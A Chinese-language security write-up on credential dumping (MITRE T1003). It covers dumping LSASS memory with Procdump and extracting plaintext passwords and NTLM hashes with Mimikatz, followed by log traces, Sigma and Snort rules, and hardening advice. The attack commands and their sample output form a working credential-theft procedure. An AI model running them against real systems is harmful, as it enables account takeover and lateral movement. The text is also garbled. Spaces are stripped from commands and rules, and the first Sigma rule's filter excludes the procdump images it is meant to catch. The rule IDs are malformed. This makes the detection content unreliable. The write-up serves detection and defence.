# T1003-Win-Procdump明文凭证

## 描述

凭据导出（CredentialDumping,MITREATT&CKT1003）是指攻击者从操作系统或软件中提取登录凭据（明文密码或哈希）以进行横向移动或访问受限资源。Windows系统中，用户登录后，凭据存储在本地安全机构子系统服务（LSASS）进程内存中。攻击者可通过工具如Procdump转储LSASS进程内存，并在本地使用Mimikatz等工具提取明文密码或哈希。此技术利用SecuritySupportProviderInterface（SSPI）相关的安全支持提供商（SSP），如MSV、WDigest、Kerberos和CredSSP，获取存储的凭据。成功提取凭据后，攻击者可用于权限提升、持久化或进一步攻击。

## 测试案例

**测试环境**：
- 系统：WindowsServer2008R2/2016或Windows7/10
- 工具：Procdump（Sysinternals）、Mimikatz
- 要求：本地管理员权限、启用Sysmon日志、域环境（可选，lab.local）
- 用户：Administrator（测试账户）

**测试准备**：
1. 下载Procdump（<https://docs.microsoft.com/en-us/sysinternals/downloads/procdump>）和Mimikatz（<https://github.com/gentilkiwi/mimikatz>）。
2. 安装Sysmon并配置事件ID1（进程创建）、10（进程访问）、11（文件操作）。
3. 启用Windows安全日志审计（组策略：计算机配置>策略>Windows设置>安全设置>本地策略>审核策略>进程跟踪）。
4. 确保目标系统有活跃用户会话（凭据存储在LSASS）。

**测试步骤**：
1. **使用Procdump转储LSASS进程内存**（目标主机，管理员权限）：
   ```cmd
   procdump64.exe-malsass.exelsass_dump.dmp
   ```
   预期输出：
   ```
   ProcDumpv8.0-Writesprocessdumpfiles
   [13:42:47]Dump1initiated:lsass_dump.dmp
   [13:42:50]Dump1writing:Estimateddumpfilesizeis50MB.
   [13:42:51]Dump1complete:50MBwrittenin3.3seconds
   ```
2. **将转储文件传输到本地分析系统**（通过SMB、FTP等）。
3. **使用Mimikatz提取凭据**（本地系统）：
   ```cmd
   mimikatz.exe"sekurlsa::minidumplsass_dump.dmp""sekurlsa::logonpasswords"exit
   ```
   预期输出：
   ```
   AuthenticationId:0;999(00000000:000003e7)
   Session:Interactivefrom1
   UserName:Administrator
   Domain:LAB
   LogonServer:DC
   LogonTime:2025-06-1713:40:00
   SID:S-1-5-21-...
   msv:
     [00000003]Primary
       *Username:Administrator
       *Domain:LAB
       *NTLM:<NTLMHash>
       *SHA1:<SHA1Hash>
   wdigest:
     *Username:Administrator
     *Domain:LAB
     *Password:Password123
   ```
4. **验证提取的凭据**：
   使用提取的密码（如Password123）或哈希尝试登录其他系统。

**参考资源**：
- Procdump使用指南：<https://docs.microsoft.com/en-us/sysinternals/downloads/procdump>
- Mimikatz文档：<https://github.com/gentilkiwi/mimikatz>
- LSASS凭据提取：<https://adsecurity.org/?p=1760>

## 检测日志

**数据来源**：
- **Sysmon日志**（推荐）：
  - 事件ID1：进程创建（procdump.exe）
  - 事件ID10：进程访问（procdump访问lsass.exe）
  - 事件ID11：文件操作（lsass_dump.dmp创建）
- **Windows安全日志**：
  - 事件ID4688：新进程创建（procdump.exe）
  - 事件ID4656：进程访问lsass.exe（需启用对象访问审计）
- **网络流量**：
  - 捕获转储文件传输（SMB445/TCP、FTP21/TCP等）。
- **PowerShell日志**（可选）：
  - 事件ID4103/4104：若通过PowerShell调用procdump。

**关键日志字段**：
- 事件ID1/4688：
  - `Image`：C:\path\to\procdump.exe或procdump64.exe
  - `CommandLine`：包含`-malsass.exe`
  - `OriginalFileName`：procdump
  - `ParentImage`：cmd.exe或powershell.exe
- 事件ID10：
  - `SourceImage`：procdump.exe
  - `TargetImage`：lsass.exe
- 事件ID11：
  - `TargetFilename`：lsass_dump.dmp

## 测试复现

**环境配置**：
- 系统：WindowsServer2008R2
- 工具：Procdump64.exe、Mimikatz
- 用户：Administrator（密码：Password123）
- 日志：Sysmon（事件ID1、10、11）
- 路径：C:\Users\Administrator\Desktop\Procdump

**复现步骤**：
1. 执行Procdump转储LSASS：
   ```cmd
   C:\Users\Administrator\Desktop\Procdump>procdump64.exe-malsass.exe1.dmp
   ProcDumpv8.0-Writesprocessdumpfiles
   [13:42:47]Dump1initiated:C:\Users\Administrator\Desktop\Procdump\1.dmp
   [13:42:50]Dump1writing:Estimateddumpfilesizeis50MB.
   [13:42:51]Dump1complete:50MBwrittenin3.3seconds
   ```
2. 传输1.dmp到本地系统（通过共享文件夹）。
3. 使用Mimikatz提取凭据：
   ```cmd
   C:\Tools\mimikatz>mimikatz.exe"sekurlsa::minidump1.dmp""sekurlsa::logonpasswords"exit
   msv:
     *Username:Administrator
     *Domain:LAB
     *NTLM:<NTLMHash>
   wdigest:
     *Username:Administrator
     *Domain:LAB
     *Password:Password123
   ```
4. 验证日志：检查Sysmon事件ID1（procdump执行）、10（lsass访问）、11（1.dmp创建）。

## 测试留痕

**Sysmon日志**：
- **事件ID1**（进程创建）：
  ```xml
  <Event>
    <EventData>
      <DataName="Image">C:\Users\Administrator\Desktop\Procdump\procdump64.exe</Data>
      <DataName="CommandLine">procdump64.exe-malsass.exe1.dmp</Data>
      <DataName="OriginalFileName">procdump</Data>
      <DataName="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <DataName="User">LAB\Administrator</Data>
    </EventData>
  </Event>
  ```
- **事件ID10**（进程访问）：
  ```xml
  <Event>
    <EventData>
      <DataName="SourceImage">C:\Users\Administrator\Desktop\Procdump\procdump64.exe</Data>
      <DataName="TargetImage">C:\Windows\System32\lsass.exe</Data>
      <DataName="CallTrace">procdump64.exe|ntdll.dll|kernel32.dll</Data>
    </EventData>
  </Event>
  ```
- **事件ID11**（文件创建）：
  ```xml
  <Event>
    <EventData>
      <DataName="TargetFilename">C:\Users\Administrator\Desktop\Procdump\1.dmp</Data>
      <DataName="Image">C:\Users\Administrator\Desktop\Procdump\procdump64.exe</Data>
    </EventData>
  </Event>
  ```

**Windows安全日志**：
- **事件ID4688**（进程创建）：
  ```xml
  <Event>
    <EventData>
      <DataName="ProcessName">C:\Users\Administrator\Desktop\Procdump\procdump64.exe</Data>
      <DataName="CommandLine">procdump64.exe-malsass.exe1.dmp</Data>
      <DataName="SubjectUserName">Administrator</Data>
    </EventData>
  </Event>
  ```

**网络日志**（若涉及文件传输）：
- SMB流量（445/TCP）：传输1.dmp文件。

## 检测规则/思路

### Sigma规则

**规则一：检测Procdump转储LSASS行为**：
```yaml
title:Procdump转储LSASS凭据检测
id:i9d0e1f2-3g4h-5i6j-dk5e-2f3g4h5i6j7k
status:stable
description:检测使用Procdump转储LSASS进程内存以获取凭据的行为
references:
  -https://attack.mitre.org/techniques/T1003/
  -https://adsecurity.org/?p=1760
tags:
  -attack.credential_access
  -attack.t1003
logsource:
  category:process_creation
  product:windows
detection:
  selection:
    EventID|in:
      -4688
      -1
    OriginalFileName:'procdump'
    CommandLine|contains:
      -'-malsass.exe'
      -'lsass.exe'
  filter:
    Image|endswith:
      -'\procdump.exe'
      -'\procdump64.exe'
  condition:selectionandnotfilter
fields:
  -ComputerName
  -User
  -Image
  -CommandLine
  -OriginalFileName
falsepositives:
  -管理员合法使用Procdump进行调试
  -安全测试工具误报
level:critical
```

**规则二：检测Procdump访问LSASS进程**：
```yaml
title:Procdump访问LSASS进程检测
id:j0e1f2g3-4h5i-6j7k-el6f-3g4h5i6j7k8l
status:stable
description:检测Procdump尝试访问LSASS进程的行为
references:
  -https://attack.mitre.org/techniques/T1003/
tags:
  -attack.credential_access
  -attack.t1003
logsource:
  category:process_access
  product:windows
detection:
  selection:
    EventID:10
    SourceImage|endswith:
      -'\procdump.exe'
      -'\procdump64.exe'
    TargetImage|endswith:'\lsass.exe'
  condition:selection
fields:
  -ComputerName
  -SourceImage
  -TargetImage
  -CallTrace
falsepositives:
  -合法调试工具访问LSASS
level:high
```

**规则优化说明**：
- 规则一：利用`OriginalFileName`（Sysmon10.2+）检测Procdump，即使文件名被重命名。
- 规则二：聚焦事件ID10，检测Procdump对LSASS的直接访问行为。
- 排除合法Procdump路径（`\procdump.exe`、`\procdump64.exe`），降低误报。

### 检测思路

1. **日志监控**：
   - 监控事件ID1/4688，检测`procdump.exe`执行，关注命令行包含`lsass.exe`。
   - 监控事件ID10，检测`procdump.exe`访问`lsass.exe`。
   - 监控事件ID11，检测`.dmp`文件创建。

2. **行为分析**：
   - 检测非管理员用户运行Procdump的异常行为。
   - 监控短时间内多次LSASS内存转储尝试。

3. **文件监控**：
   - 监控`.dmp`文件创建，关注路径如`C:\Users\*\*.dmp`。
   - 启用对象访问审计，检测`lsass.exe`的异常访问。

4. **网络监控**：
   - 捕获`.dmp`文件传输流量（SMB445/TCP、FTP21/TCP）。
   - 示例Snort规则：
     ```snort
     alerttcpanyany->any445(msg:"LSASSDumpFileTransfer";content:".dmp";sid:1000005;)
     ```

5. **关联分析**：
   - 结合事件ID4624（登录成功），检测转储后的异常登录。
   - 监控Mimikatz执行（事件ID1，`mimikatz.exe`）。

## 防御建议

1. **权限管理**：
   - 限制普通用户对`lsass.exe`的访问权限（通过组策略）。
   - 仅允许必要管理员使用Procdump。

2. **日志与监控**：
   - 部署Sysmon，启用事件ID1、10、11。
   - 启用事件ID4688和4656（对象访问审计）。
   - 使用SIEM（如Splunk）关联Procdump执行和LSASS访问。

3. **凭据保护**：
   - 启用CredentialGuard（Windows10/2016+），防止LSASS存储明文凭据。
   - 禁用WDigest协议（组策略：计算机配置>管理模板>MSSecurityGuide>WDigestAuthentication）。

4. **工具限制**：
   - 使用AppLocker或WDAC限制`procdump.exe`和`mimikatz.exe`的执行。
   - 监控非Sysinternals签名的Procdump副本。

5. **主动防御**：
   - 部署诱捕凭据（HoneyCredentials），监控异常LSASS访问。
   - 使用EDR工具检测Procdump和Mimikatz行为。

## 参考推荐

- MITREATT&CK:CredentialDumping(T1003)  
  <https://attack.mitre.org/techniques/T1003/>
- Procdump使用指南  
  <https://docs.microsoft.com/en-us/sysinternals/downloads/procdump>
- Mimikatz文档  
  <https://github.com/gentilkiwi/mimikatz>
- WindowsSSPI模型  
  <https://docs.microsoft.com/zh-cn/windows/win32/secauthn/sspi-model>
- MSV身份验证包  
  <https://blog.csdn.net/lionzl/article/details/7725116>
- WDigest摘要认证协议  
  <https://www.4hou.com/info/news/8126.html>
- Kerberos身份认证协议  
  <https://www.cnblogs.com/adylee/articles/893448.html>
- CredSSP协议  
  <https://docs.microsoft.com/zh-cn/windows/win32/secauthn/credential-security-support-provider>
- LSASS凭据提取防御  
  <https://adsecurity.org/?p=1760>
